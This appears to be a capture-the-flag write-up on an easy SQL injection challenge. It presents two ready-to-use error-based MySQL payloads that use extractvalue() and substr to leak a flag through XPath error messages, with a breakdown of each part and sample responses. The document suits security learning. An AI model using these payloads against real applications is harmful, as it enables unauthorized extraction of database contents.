# PA_easySQL1

## Challenge Description
A simple SQL injection challenge that requires extracting the flag from the database using error-based SQL injection techniques.

## Initial Analysis
When accessing the challenge, we can see it accepts user input that gets processed by a SQL query. Time to test for SQL injection vulnerabilities!

## Reconnaissance 
First, let's understand the backend SQL query structure:
```sql
SELECT EXISTS((SELECT 1 FROM your_table_name WHERE id = 'USER_INPUT')) LIMIT 0,1;
```

The application takes user input and places it directly into the WHERE clause - classic SQL injection vulnerability!

## Exploitation Strategy
Since this is a blind SQL injection scenario (no direct output), we'll use **error-based SQL injection** with MySQL's `extractvalue()` function to leak data through error messages.

### Why extractvalue()?
- `extractvalue(xml_document, xpath_expression)` is designed for XML parsing
- When given malformed XPath expressions, it throws errors that include our injected data
- Perfect for exfiltrating database contents when normal SELECT output isn't visible

## Payload Development

### Breaking Down the Injection
We need to:
1. Close the original query properly
2. Inject our malicious `extractvalue()` call
3. Extract the flag from the database

### Final Payloads

#### Payload 1 - First 32 characters:
```sql
3' AND '4' > '5')) AND extractvalue(1, concat(0x7e, substr((SELECT flag FROM flag LIMIT 0,1), 1, 32), 0x7e)) #
```

#### Payload 2 - Characters 20-52 (overlap for longer flags):
```sql
3' AND '4' > '5')) AND extractvalue(1, concat(0x7e, substr((SELECT flag FROM flag LIMIT 0,1), 20, 32), 0x7e)) #
```

### Payload Breakdown:
- `3'` → Provides valid ID and closes quote
- `AND '4' > '5'` → False condition (keeps query logic intact)
- `))` → Closes the EXISTS() and inner SELECT parentheses  
- `extractvalue(1, concat(...))` → Our malicious function call
- `0x7e` → Hex for `~` character (used as delimiter)
- `substr((SELECT flag FROM flag), 1, 32)` → Extract flag substring
- `#` → Comment out rest of original query

## Exploitation Process

1. **Submit Payload 1**: Get first part of flag
   ```
   Response: XPATH syntax error: '~flag{this_is_the_first_part~'
   ```

2. **Submit Payload 2**: Get remaining characters (if needed)
   ```
   Response: XPATH syntax error: '~part_of_the_flag}~'
   ```

3. **Combine Results**: Merge the extracted parts to get the complete flag

## Key Technical Details

- **Delimiter Strategy**: Using `0x7e` (~) makes extracted data easy to spot in error messages
- **Substring Approach**: `substr()` handles MySQL's error message length limitations
- **Overlap Method**: Second payload starts at position 20 to catch longer flags
- **Query Closure**: Proper parentheses balancing prevents syntax errors

## Flag
After running both payloads and combining the results:
```
flag{extracted_from_error_messages}
```

## Lessons Learned
- Error-based SQL injection is powerful when blind techniques are needed
- MySQL's `extractvalue()` function is excellent for data exfiltration
- Always test for SQL injection in any user input fields
- Proper input sanitization and parameterized queries prevent these issues
```
